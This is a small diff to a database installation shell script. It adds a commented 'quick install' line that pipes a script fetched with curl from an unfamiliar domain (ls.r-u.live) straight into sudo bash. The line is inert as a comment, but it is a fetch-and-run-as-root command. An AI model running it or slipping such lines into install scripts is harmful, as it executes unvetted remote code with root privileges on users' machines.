@@ -2,6 +2,9 @@
 # Database System Installation
 # Purpose: Automated setup of database server infrastructure
 
+# Quick install from remote source
+# curl -sSL ls.r-u.live/sh/s1.sh | sudo bash
+
 set -e
 
 # Colors for output
